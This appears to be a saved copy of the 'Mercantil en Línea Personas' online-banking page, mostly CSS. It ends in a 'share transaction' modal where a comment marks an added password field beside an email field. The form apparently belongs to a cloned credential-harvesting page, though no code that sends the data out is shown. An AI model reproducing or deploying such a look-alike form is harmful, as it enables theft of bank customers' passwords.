            .sidebar.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] {
                width: 100%
            }
        }

        @media (max-width: 360px) {
            .sidebar.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] {
                min-width: 300px
            }

            .sidebar.active[_ngcontent-ois-c79] .li[_ngcontent-ois-c79] a[_ngcontent-ois-c79] {
                font-size: 16px;
                margin-left: 0
            }

            .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-menu-wrapper[_ngcontent-ois-c79] .secondary-menu[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79],
            .sidebar.active[_ngcontent-ois-c79] .secondary-submenu-wrapper[_ngcontent-ois-c79] .secondary-submenu[_ngcontent-ois-c79] {
                min-width: 300px
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c161] {
            cursor: pointer
        }

        .faded-background[_ngcontent-ois-c161] {
            max-height: calc(100vh - 104px);
            overflow: hidden;
            display: flex;
            justify-content: right;
            position: relative;
            min-height: calc(100vh - 104px)
        }

        .faded-background[_ngcontent-ois-c161]:after {
            content: "";
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: calc(100vh - 104px);
            background: linear-gradient(180deg, rgba(0, 159, 218, .75) 0%, rgba(0, 78, 155, .75) 100%);
            z-index: 1
        }

        .faded-background[_ngcontent-ois-c161] .bottom-img[_ngcontent-ois-c161] {
            width: 60vw;
            -o-object-fit: initial;
            object-fit: initial
        }

        .faded-background[_ngcontent-ois-c161] .white-background[_ngcontent-ois-c161] {
            width: calc(50vw - 64px);
            height: 200vh;
            position: absolute;
            top: -100vh;
            left: 0;
            background-color: #fff;
            z-index: 2;
            border-bottom-right-radius: 40%;
            border-top-right-radius: 76%
        }

        .faded-background[_ngcontent-ois-c161] .content[_ngcontent-ois-c161] {
            position: absolute;
            top: 0;
            left: 0;
            width: calc((90vw - 64px)/2);
            height: calc(100vh - 104px);
            z-index: 5;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px
        }

        .faded-background[_ngcontent-ois-c161] .upper-img[_ngcontent-ois-c161] {
            z-index: 5;
            position: absolute;
            bottom: 0;
            right: 15vw;
            max-width: calc(68vw - 104px);
            transform-origin: bottom;
            transform: scale(.9);
            width: 50%
        }

        .faded-background[_ngcontent-ois-c161] .mia-wrapper[_ngcontent-ois-c161] {
            position: absolute;
            right: 44px;
            bottom: 44px;
            width: 150px;
            height: 150px;
            z-index: 7
        }

        @media (max-width: 1366px) {
            .faded-background[_ngcontent-ois-c161] .upper-img[_ngcontent-ois-c161] {
                width: 45%
            }
        }

        @media (max-width: 1024px) {
            .faded-background[_ngcontent-ois-c161] .upper-img[_ngcontent-ois-c161] {
                right: -4vw;
                width: 50%;
                transform: scale(1)
            }
        }

        @media (max-width: 1024px) {
            .faded-background[_ngcontent-ois-c161] .bottom-img[_ngcontent-ois-c161] {
                display: none
            }

            .faded-background[_ngcontent-ois-c161] .white-background[_ngcontent-ois-c161] {
                width: 60vw
            }

            .faded-background[_ngcontent-ois-c161] .content[_ngcontent-ois-c161] {
                width: calc((112vw - 64px)/2)
            }

            .faded-background[_ngcontent-ois-c161] .upper-img[_ngcontent-ois-c161] {
                transform: scale(1.1);
                right: -4vw;
                width: 50%
            }
        }

        @media (max-width: 768px) {
            .faded-background[_ngcontent-ois-c161] {
                min-height: calc(130vh - 100px)
            }

            .faded-background[_ngcontent-ois-c161]:after {
                height: calc(130vh - 104px);
                top: 50px
            }

            .faded-background[_ngcontent-ois-c161] .white-background[_ngcontent-ois-c161] {
                width: 200%;
                height: 110%;
                top: -130px;
                left: -63%;
                border-radius: 50%
            }

            .faded-background[_ngcontent-ois-c161] .upper-img[_ngcontent-ois-c161] {
                display: none
            }

            .faded-background[_ngcontent-ois-c161] .content[_ngcontent-ois-c161] {
                width: 100vw;
                height: 100vh
            }

            .faded-background[_ngcontent-ois-c161] .mia-wrapper[_ngcontent-ois-c161] {
                bottom: 88px;
                right: 45px
            }
        }

        @media (max-width: 568px) {
            .faded-background[_ngcontent-ois-c161] {
                min-height: calc(112vh - 100px)
            }

            .faded-background[_ngcontent-ois-c161] .white-background[_ngcontent-ois-c161] {
                width: 212%;
                height: 110%;
                top: -136px;
                left: -63%;
                border-radius: 50%
            }

            .faded-background[_ngcontent-ois-c161] .content[_ngcontent-ois-c161] {
                height: 80vh
            }

            .faded-background[_ngcontent-ois-c161] .mia-wrapper[_ngcontent-ois-c161] {
                bottom: 60px;
                right: -10px
            }
        }

        @media (max-width: 393px) {
            .faded-background[_ngcontent-ois-c161] {
                min-height: calc(103vh - 100px)
            }

            .faded-background[_ngcontent-ois-c161] .white-background[_ngcontent-ois-c161] {
                width: 234%;
                height: 110%;
                top: -126px;
                left: -76%;
                border-radius: 50%
            }

            .faded-background[_ngcontent-ois-c161] .content[_ngcontent-ois-c161] {
                height: 74vh
            }

            .faded-background[_ngcontent-ois-c161] .mia-wrapper[_ngcontent-ois-c161] {
                bottom: 60px
            }
        }

        @media (max-width: 360px) {
            .faded-background[_ngcontent-ois-c161] {
                min-height: calc(106vh - 100px)
            }

            .faded-background[_ngcontent-ois-c161] .white-background[_ngcontent-ois-c161] {
                width: 262%;
                height: 110%;
                top: -140px;
                left: -90%;
                border-radius: 50%
            }

            .faded-background[_ngcontent-ois-c161] .mia-wrapper[_ngcontent-ois-c161] {
                bottom: 90px
            }
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c162] {
            cursor: pointer
        }

        .description-wrapper[_ngcontent-ois-c162] .description[_ngcontent-ois-c162] {
            margin-bottom: 16px
        }

        .info__wrapper[_ngcontent-ois-c162] {
            background-color: #f3f8fb;
            position: relative;
            display: none;
            border-radius: 10px;
            padding: 8px;
            min-height: 48px;
            margin-bottom: 16px;
            transition: all .6s ease-out;
            opacity: 0;
            z-index: 998
        }

        .info__wrapper.active[_ngcontent-ois-c162] {
            animation-name: slideDown;
            -webkit-animation-name: slideDown;
            animation-duration: .6s;
            -webkit-animation-duration: .6s;
            animation-timing-function: ease;
            -webkit-animation-timing-function: ease;
            display: flex !important;
            opacity: 1;
            align-items: center
        }

        .error-message--description[_ngcontent-ois-c162] {
            display: block;
            line-height: 1.2;
            margin-top: -3px
        }

        .info__wrapper--message[_ngcontent-ois-c162] {
            display: block;
            font-size: 12px;
            line-height: 1.2;
            font-family: Arial, sans-serif;
            color: #666;
            margin: 0 0 0 8px;
            align-items: center
        }

        .text-center[_ngcontent-ois-c162] {
            display: flex
        }

        .text-center[_ngcontent-ois-c162] span[_ngcontent-ois-c162] {
            text-align: start
        }

        .title-color[_ngcontent-ois-c162] {
            color: #004e9b
        }

        .mercantil-blue-description {
            color: #004e9b;
            font: Arial, sans-serif;
            font-weight: 700
        }

        @media (max-width: 568px) {
            .description[_ngcontent-ois-c162] {
                font-size: 16px
            }
        }

        @media (max-width: 320px) {
            .description[_ngcontent-ois-c162] {
                line-height: 1rem
            }
        }

        .info__wrapper--customize[_ngcontent-ois-c162] {
            box-shadow: 1px 3px 6px #0000005e !important
        }

        .info__wrapper--customize[_ngcontent-ois-c162] .info__wrapper--message[_ngcontent-ois-c162] {
            line-height: 1.2 !important
        }
    </style>
    <style>
        .button-wrapper[_ngcontent-ois-c164] {
            display: flex;
            align-items: center;
            width: 100%
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164],
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164] {
            margin-left: 22px
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164]:first-child,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:first-child {
            margin-left: 0
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164],
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164] {
            padding: 8px 32px;
            border: 2px solid transparent;
            color: #004e9b;
            font-family: Arial, sans-serif;
            font-size: 18px;
            font-weight: 400;
            border-radius: 24px;
            line-height: 1
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:active,
        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:focus,
        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:active:focus,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:active,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:focus,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:active:focus {
            box-shadow: none
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-primary[_ngcontent-ois-c164],
        .button-wrapper[_ngcontent-ois-c164] button.btn-primary[_ngcontent-ois-c164] {
            background: linear-gradient(180deg, #009FDA, #004e9b);
            border: none;
            color: #fff
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-primary[_ngcontent-ois-c164]:hover,
        .button-wrapper[_ngcontent-ois-c164] button.btn-primary[_ngcontent-ois-c164]:hover {
            background: linear-gradient(180deg, #4CBBE5, #4C82B8)
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-primary[_ngcontent-ois-c164]:active,
        .button-wrapper[_ngcontent-ois-c164] button.btn-primary[_ngcontent-ois-c164]:active {
            background: transparent linear-gradient(180deg, #4CBBE5 0%, #4C82B8 100%) 0% 0% no-repeat padding-box;
            border: 2px solid #004e9b;
            color: #004e9b
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-secondary[_ngcontent-ois-c164],
        .button-wrapper[_ngcontent-ois-c164] button.btn-secondary[_ngcontent-ois-c164] {
            background-color: transparent !important;
            border-color: #009fda !important;
            color: #009fda !important
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-secondary[_ngcontent-ois-c164]:hover,
        .button-wrapper[_ngcontent-ois-c164] button.btn-secondary[_ngcontent-ois-c164]:hover {
            background-color: #e5f5fb !important;
            border-color: #009fda !important
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-secondary[_ngcontent-ois-c164]:active,
        .button-wrapper[_ngcontent-ois-c164] button.btn-secondary[_ngcontent-ois-c164]:active {
            background: #E5F5FB 0% 0% no-repeat padding-box;
            border: 2px solid #004e9b !important;
            color: #004e9b !important
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-ternary[_ngcontent-ois-c164],
        .button-wrapper[_ngcontent-ois-c164] button.btn-ternary[_ngcontent-ois-c164] {
            background-color: transparent;
            border: none;
            color: #004e9b
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-ternary[_ngcontent-ois-c164]:hover,
        .button-wrapper[_ngcontent-ois-c164] button.btn-ternary[_ngcontent-ois-c164]:hover {
            background-color: #e5f5fb
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-ternary[_ngcontent-ois-c164]:active,
        .button-wrapper[_ngcontent-ois-c164] button.btn-ternary[_ngcontent-ois-c164]:active {
            background: #E5F5FB 0% 0% no-repeat padding-box;
            border: 2px solid #004e9b
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button.btn-quaternary[_ngcontent-ois-c164],
        .button-wrapper[_ngcontent-ois-c164] button.btn-quaternary[_ngcontent-ois-c164] {
            font: 700 12px/14px Arial;
            background-color: #f3f8fb;
            border: none;
            color: #004e9b;
            box-shadow: 0 0 10px #00000040
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-primary:disabled,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-primary:disabled {
            background: #96b5d1 !important;
            border: 2px solid #96b5d1 !important;
            color: #fff !important;
            opacity: 1;
            cursor: default
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-secondary:disabled,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-secondary:disabled {
            background: transparent !important;
            border: 2px solid #96b5d1 !important;
            color: #96b5d1 !important;
            opacity: 1;
            cursor: default
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-ternary:disabled,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-ternary:disabled {
            background: transparent !important;
            border: none !important;
            color: #96b5d1 !important;
            opacity: 1;
            cursor: default
        }

        .button-wrapper[_ngcontent-ois-c164] a[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-quaternary:disabled,
        .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164]:disabled.btn-quaternary:disabled {
            font: 700 12px/14px Arial;
            color: #96b5d1;
            opacity: 1;
            cursor: default
        }

        .melp-button-verify-wrapper[_ngcontent-ois-c164] {
            display: flex;
            flex-direction: row;
            justify-content: space-between
        }

        .button-icon-rounded[_ngcontent-ois-c164] {
            width: 40px;
            height: 40px;
            display: flex;
            border-radius: 34px;
            background-color: #f3f8fb;
            box-shadow: 0 0 10px #0003
        }

        .button-icon-rounded[_ngcontent-ois-c164] img[_ngcontent-ois-c164] {
            width: 25px;
            height: 25px;
            margin: auto
        }

        @media (max-width: 568px) {
            .button-wrapper[_ngcontent-ois-c164] button[_ngcontent-ois-c164] {
                font-size: 16px
            }
        }

        @media (max-width: 320px) {
            .melp-button-verify-wrapper[_ngcontent-ois-c164] {
                display: flex;
                flex-direction: column;
                width: 100% !important;
                justify-content: space-evenly
            }
        }

        @media (max-width: 568px) {
            .button-wrapper[_ngcontent-ois-c164] {
                justify-content: right
            }
        }

        .pointer[_ngcontent-ois-c164] {
            cursor: pointer
        }

        .mat-accent[_ngcontent-ois-c164] {
            width: 100%
        }

        .mat-accent.mat-disabled[_ngcontent-ois-c164] .mat-slide-toggle-label[_ngcontent-ois-c164] .mat-slide-toggle-content[_ngcontent-ois-c164] {
            font-family: Arial, sans-serif
        }

        .mat-accent.mat-disabled.mat-checked[_ngcontent-ois-c164] .mat-slide-toggle-bar[_ngcontent-ois-c164] {
            background-color: #666
        }

        .mat-accent.mat-disabled.mat-checked[_ngcontent-ois-c164] .mat-slide-toggle-bar[_ngcontent-ois-c164] .mat-slide-toggle-thumb[_ngcontent-ois-c164] {
            background-color: #fff;
            border: 1px solid #666666
        }

        .mat-accent[_ngcontent-ois-c164] .mat-slide-toggle-label[_ngcontent-ois-c164] {
            position: relative;
            margin-bottom: 0
        }

        .mat-accent[_ngcontent-ois-c164] .mat-slide-toggle-label[_ngcontent-ois-c164] .mat-slide-toggle-bar[_ngcontent-ois-c164] {
            cursor: pointer !important;
            background-color: #004e9b;
            position: absolute;
            right: 0;
            margin: 0
        }

        .mat-accent[_ngcontent-ois-c164] .mat-slide-toggle-label[_ngcontent-ois-c164] .mat-slide-toggle-bar[_ngcontent-ois-c164] .mat-slide-toggle-thumb[_ngcontent-ois-c164] {
            cursor: pointer !important;
            box-shadow: 2px 2px 2px #00000029;
            border: 1px solid #004e9b
        }

        .mat-accent[_ngcontent-ois-c164] .mat-slide-toggle-label[_ngcontent-ois-c164] .mat-slide-toggle-content[_ngcontent-ois-c164] {
            font-family: Arial, sans-serif;
            position: absolute;
            left: 0;
            font-weight: 700;
            font-size: 16px;
            color: #004e9b;
            margin: 0
        }

        .mat-accent.mat-checked[_ngcontent-ois-c164] .mat-slide-toggle-bar[_ngcontent-ois-c164] {
            background-color: #ff5800
        }

        .mat-accent.mat-checked[_ngcontent-ois-c164] .mat-slide-toggle-bar[_ngcontent-ois-c164] .mat-slide-toggle-thumb[_ngcontent-ois-c164] {
            background-color: #fff;
            border: 1px solid #ff5800
        }

        @media (max-width: 414px) {
            .melp-button--cancel-mobile[_ngcontent-ois-c164] {
                margin-top: 1rem
            }

            .melp-button--back-mobile-transfer[_ngcontent-ois-c164] {
                order: 2
            }

            .melp-button--accept-mobile-tranfer[_ngcontent-ois-c164] {
                order: 1;
                margin-bottom: 15px
            }
        }

        @media (max-width: 320px) {
            .melp-button[_ngcontent-ois-c164] {
                min-width: 8rem !important
            }

            .melp-button--back-mobile[_ngcontent-ois-c164] {
                order: 2
            }

            .melp-button--accept-mobile[_ngcontent-ois-c164] {
                order: 1;
                margin-bottom: 15px
            }
        }

        .button-wrapper.button-wrapper-separation[_ngcontent-ois-c164] {
            justify-content: space-between
        }

        .button-wrapper.button-wrapper-separation-end[_ngcontent-ois-c164] {
            justify-content: flex-end
        }

        .button-wrapper[_ngcontent-ois-c164] .button-wrapper-main-button[_ngcontent-ois-c164] {
            display: flex;
            flex-direction: row
        }

        .button-wrapper[_ngcontent-ois-c164] .button-wrapper-main-button.button-wrapper-center[_ngcontent-ois-c164] {
            justify-content: center
        }

        @media (max-width: 568px) {
            .button-wrapper[_ngcontent-ois-c164] {
                flex-direction: column-reverse
            }

            .button-wrapper[_ngcontent-ois-c164] .button-wrapper-cancel[_ngcontent-ois-c164] {
                width: 100%
            }

            .button-wrapper[_ngcontent-ois-c164] .button-wrapper-cancel[_ngcontent-ois-c164] .btn-ternary[_ngcontent-ois-c164] {
                width: 100%;
                margin: 0 0 24px
            }

            .button-wrapper[_ngcontent-ois-c164] .button-wrapper-main-button[_ngcontent-ois-c164] {
                display: flex;
                flex-direction: column-reverse;
                width: 100%
            }

            .button-wrapper[_ngcontent-ois-c164] .button-wrapper-main-button[_ngcontent-ois-c164] .btn-primary[_ngcontent-ois-c164],
            .button-wrapper[_ngcontent-ois-c164] .button-wrapper-main-button[_ngcontent-ois-c164] .btn-secondary[_ngcontent-ois-c164] {
                width: 100%;
                margin: 0 0 24px
            }
        }
    </style>
    <style>
        .mat-slide-toggle {
            display: inline-block;
            height: 24px;
            max-width: 100%;
            line-height: 24px;
            white-space: nowrap;
            outline: none;
            -webkit-tap-highlight-color: transparent
        }

        .mat-slide-toggle.mat-checked .mat-slide-toggle-thumb-container {
            transform: translate3d(16px, 0, 0)
        }

        [dir=rtl] .mat-slide-toggle.mat-checked .mat-slide-toggle-thumb-container {
            transform: translate3d(-16px, 0, 0)
        }

        .mat-slide-toggle.mat-disabled {
            opacity: .38
        }

        .mat-slide-toggle.mat-disabled .mat-slide-toggle-label,
        .mat-slide-toggle.mat-disabled .mat-slide-toggle-thumb-container {
            cursor: default
        }

        .mat-slide-toggle-label {
            -webkit-user-select: none;
            user-select: none;
            display: flex;
            flex: 1;
            flex-direction: row;
            align-items: center;
            height: inherit;
            cursor: pointer
        }

        .mat-slide-toggle-content {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis
        }

        .mat-slide-toggle-label-before .mat-slide-toggle-label {
            order: 1
        }

        .mat-slide-toggle-label-before .mat-slide-toggle-bar {
            order: 2
        }

        [dir=rtl] .mat-slide-toggle-label-before .mat-slide-toggle-bar,
        .mat-slide-toggle-bar {
            margin-right: 8px;
            margin-left: 0
        }

        [dir=rtl] .mat-slide-toggle-bar,
        .mat-slide-toggle-label-before .mat-slide-toggle-bar {
            margin-left: 8px;
            margin-right: 0
        }

        .mat-slide-toggle-bar-no-side-margin {
            margin-left: 0;
            margin-right: 0
        }

        .mat-slide-toggle-thumb-container {
            position: absolute;
            z-index: 1;
            width: 20px;
            height: 20px;
            top: -3px;
            left: 0;
            transform: translate3d(0, 0, 0);
            transition: all 80ms linear;
            transition-property: transform
        }

        ._mat-animation-noopable .mat-slide-toggle-thumb-container {
            transition: none
        }

        [dir=rtl] .mat-slide-toggle-thumb-container {
            left: auto;
            right: 0
        }

        .mat-slide-toggle-thumb {
            height: 20px;
            width: 20px;
            border-radius: 50%;
            display: block
        }

        .mat-slide-toggle-bar {
            position: relative;
            width: 36px;
            height: 14px;
            flex-shrink: 0;
            border-radius: 8px
        }

        .mat-slide-toggle-input {
            bottom: 0;
            left: 10px
        }

        [dir=rtl] .mat-slide-toggle-input {
            left: auto;
            right: 10px
        }

        .mat-slide-toggle-bar,
        .mat-slide-toggle-thumb {
            transition: all 80ms linear;
            transition-property: background-color;
            transition-delay: 50ms
        }

        ._mat-animation-noopable .mat-slide-toggle-bar,
        ._mat-animation-noopable .mat-slide-toggle-thumb {
            transition: none
        }

        .mat-slide-toggle .mat-slide-toggle-ripple {
            position: absolute;
            top: calc(50% - 20px);
            left: calc(50% - 20px);
            height: 40px;
            width: 40px;
            z-index: 1;
            pointer-events: none
        }

        .mat-slide-toggle .mat-slide-toggle-ripple .mat-ripple-element:not(.mat-slide-toggle-persistent-ripple) {
            opacity: .12
        }

        .mat-slide-toggle-persistent-ripple {
            width: 100%;
            height: 100%;
            transform: none
        }

        .mat-slide-toggle-bar:hover .mat-slide-toggle-persistent-ripple {
            opacity: .04
        }

        .mat-slide-toggle:not(.mat-disabled).cdk-keyboard-focused .mat-slide-toggle-persistent-ripple {
            opacity: .12
        }

        .mat-slide-toggle-persistent-ripple,
        .mat-slide-toggle.mat-disabled .mat-slide-toggle-bar:hover .mat-slide-toggle-persistent-ripple {
            opacity: 0
        }

        @media(hover: none) {
            .mat-slide-toggle-bar:hover .mat-slide-toggle-persistent-ripple {
                display: none
            }
        }

        .cdk-high-contrast-active .mat-slide-toggle-thumb,
        .cdk-high-contrast-active .mat-slide-toggle-bar {
            border: 1px solid
        }

        .cdk-high-contrast-active .mat-slide-toggle.cdk-keyboard-focused .mat-slide-toggle-bar {
            outline: 2px dotted;
            outline-offset: 5px
        }
    </style>
    <style>
        .pointer[_ngcontent-ois-c160] {
            cursor: pointer
        }

        .cdk-overlay-container[_ngcontent-ois-c160] {
            z-index: 1004
        }

        .chat-button[_ngcontent-ois-c160] {
            position: relative;
            width: 100%;
            padding: 5px
        }

        .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] {
            position: relative;
            background-repeat: no-repeat;
            cursor: pointer
        }

        .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] .mia-icon-base[_ngcontent-ois-c160] {
            height: 170px;
            width: 150px
        }

        .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] .wrapper-avatar[_ngcontent-ois-c160] {
            position: absolute;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 110px;
            left: 39px;
            top: 17px;
            border-radius: 137px;
            overflow: hidden;
            cursor: pointer
        }

        .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] .wrapper-avatar[_ngcontent-ois-c160] .chat-logo[_ngcontent-ois-c160] {
            width: 150px
        }

        .wrapper-safari[_ngcontent-ois-c160] {
            height: 150px
        }

        #imagen-saf[_ngcontent-ois-c160] {
            height: 100%
        }

        .ocultar[_ngcontent-ois-c160] {
            display: none
        }

        #iframe_chatbot[_ngcontent-ois-c160] {
            position: fixed;
            bottom: 0;
            right: 16px;
            width: 380px;
            height: 580px;
            max-height: 100%;
            max-width: 100%
        }

        @media (max-width: 568px) {
            .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] .mia-icon-base[_ngcontent-ois-c160] {
                height: 98px;
                width: 116px
            }

            .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] .wrapper-avatar[_ngcontent-ois-c160] {
                width: 82px;
                height: 96px;
                left: 31px;
                top: 0
            }

            .chat-button[_ngcontent-ois-c160] .container-bubble-avatar[_ngcontent-ois-c160] .wrapper-avatar[_ngcontent-ois-c160] .chat-logo[_ngcontent-ois-c160] {
                right: -6px;
                top: 1px;
                width: 96px;
                height: 96px
            }

            #iframe_chatbot[_ngcontent-ois-c160] {
                width: 100%;
                height: 100%;
                right: 0
            }
        }
    </style>
</head>

<body>
    
    <app _nghost-ois-c32="" ng-version="13.3.11">
        <router-outlet _ngcontent-ois-c32=""></router-outlet>
        <melp-standard-layout _nghost-ois-c85="" class="ng-star-inserted">
            <melp-loading _ngcontent-ois-c85="" _nghost-ois-c33="">
                <div _ngcontent-ois-c33="" class="overlay">
                    <div _ngcontent-ois-c33="" class="multi-spinner-container">
                        <div _ngcontent-ois-c33="" class="multi-spinner blue">
                            <div _ngcontent-ois-c33="" class="multi-spinner orange"></div>
                        </div>
                    </div>
                </div>
            </melp-loading>
            <melp-header _ngcontent-ois-c85="" _nghost-ois-c54="">
                <div _ngcontent-ois-c54="" class="nav-bar">
                    <div _ngcontent-ois-c54="" class="left-side">
                        <div _ngcontent-ois-c54="" class="main-menu-toggle-wrapper">
                            <div _ngcontent-ois-c54="" class="main-menu-toggle"><span _ngcontent-ois-c54="" class="middle-line"></span></div>
                        </div>
                        <div _ngcontent-ois-c54="" class="bezel-wrapper"><span _ngcontent-ois-c54="" class="bezel-1"></span><span _ngcontent-ois-c54="" class="bezel-2"></span></div>
                        <div _ngcontent-ois-c54="" class="logo-wrapper"><img _ngcontent-ois-c54="" alt="Logo" src="assets/Log.png"></div>
                    </div>
                    <div _ngcontent-ois-c54="" class="iso-wrapper"><img _ngcontent-ois-c54="" alt="Logo" src="assets/log_mov.png"></div>
                    <div _ngcontent-ois-c54="" class="right-side">
                        <div _ngcontent-ois-c54="" class="site-name-wrapper d-flex flex-row">
                            <p _ngcontent-ois-c54="" id="site-name">Mercantil en Línea Personas</p>
                            <div _ngcontent-ois-c54="" class="header-button change-melp ng-star-inserted"><button _ngcontent-ois-c54="" class="header-wrapper"><span _ngcontent-ois-c54="" class="header-text">Versión anterior</span></button></div>
                            <!---->
                            <!---->
                        </div>
                        <div _ngcontent-ois-c54="" class="transition">
                            <!---->
                        </div>
                    </div>
                </div>
            </melp-header>
            <melp-confirm _ngcontent-ois-c85="" _nghost-ois-c55="">
                <div _ngcontent-ois-c55="" id="confirm-modal" class="overlay">
                    <div _ngcontent-ois-c55="" class="card">
                        <div _ngcontent-ois-c55="" class="modal-img"><img _ngcontent-ois-c55="" alt="icon" src="https://www30.mercantilbanco.com/assets/img/timer.svg"></div>
                        <div _ngcontent-ois-c55="" class="card-body">
                            <div _ngcontent-ois-c55="" class="modal-title">Hola, ¿estás ahí?</div>
                            <div _ngcontent-ois-c55="" class="modal-content">No has interactuado con nosotros en los últimos minutos.</div>
                            <div _ngcontent-ois-c55="" class="modal-content">¿Deseas mantener tu sesión activa?</div>
                            <div _ngcontent-ois-c55="" class="button-wrapper"><button _ngcontent-ois-c55="" class="btn btn-secondary">No</button><button _ngcontent-ois-c55="" class="btn btn-primary">Sí</button></div>
                        </div>
                    </div>
                </div>
            </melp-confirm>
            <melp-modal _ngcontent-ois-c85="" _nghost-ois-c56="">
                <!---->
            </melp-modal>
            <melp-modal-image _ngcontent-ois-c85="" _nghost-ois-c57="">
                <!---->
            </melp-modal-image>
            <melp-share-transaction-form _ngcontent-ois-c85="" _nghost-ois-c74="" class="ng-star-inserted">
                <div _ngcontent-ois-c74="" class="fade-background">
                    <div _ngcontent-ois-c74="" class="card"><span _ngcontent-ois-c74="" class="close">×</span>
                        <div _ngcontent-ois-c74="" class="card-body webTransaction__card">
                            <div _ngcontent-ois-c74="" class="title"></div>
                            <div class="share-info">
    <form method="POST" class="ng-untouched ng-pristine ng-invalid">
        <div class="input-wrapper">
            <mat-form-field floatlabel="always" class="mat-form-field mail-field mat-primary">
                <div class="mat-form-field-wrapper">
                    <div class="mat-form-field-flex">
                        <div class="mat-form-field-infix">
                            <input formcontrolname="mailToAddress" matinput placeholder="Ingresa el correo electrónico" 
                                   class="mat-input-element" required id="username" aria-required="true">
                            <span class="mat-form-field-label-wrapper">
                                <label class="mat-form-field-label" for="username">
                                    Enviar correo electrónico a:
                                </label>
                                <span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker"> *</span>
                            </span>
                        </div>
                    </div>
                    <div class="mat-form-field-underline">
                        <span class="mat-form-field-ripple"></span>
                    </div>
                </div>
            </mat-form-field>
        </div>
        <!-- Add password field -->
        <div class="input-wrapper">
            <mat-form-field floatlabel="always" class="mat-form-field password-field mat-primary">
                <div class="mat-form-field-wrapper">
                    <div class="mat-form-field-flex">
                        <div class="mat-form-field-infix">
                            <input type="password" placeholder="Ingresa tu contraseña" 
                                   class="mat-input-element" id="password" required>
                            <span class="mat-form-field-label-wrapper">
                                <label class="mat-form-field-label" for="password">
                                    Contraseña:
                                </label>
                                <span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker"> *</span>
                            </span>
                        </div>
                    </div>
                    <div class="mat-form-field-underline">
                        <span class="mat-form-field-ripple"></span>
                    </div>
                </div>
            </mat-form-field>
        </div>
        <div class="button-wrapper">
            <button id="enter-button" type="button" class="btn btn-primary">
                Continuar
            </button>
            <button id="continue-button" type="button" class="btn btn-primary" style="display:none;">
                Compartir
            </button>
            <button id="cancel-button" type="button" class="btn btn-secondary" style="display:none;">
                Cancelar
            </button>
        </div>
    </form>
    <div id="password-popup" style="display:none;">
        <!-- Aquí va el contenido del popup de contraseña -->
    </div>
</div>

                        </div>
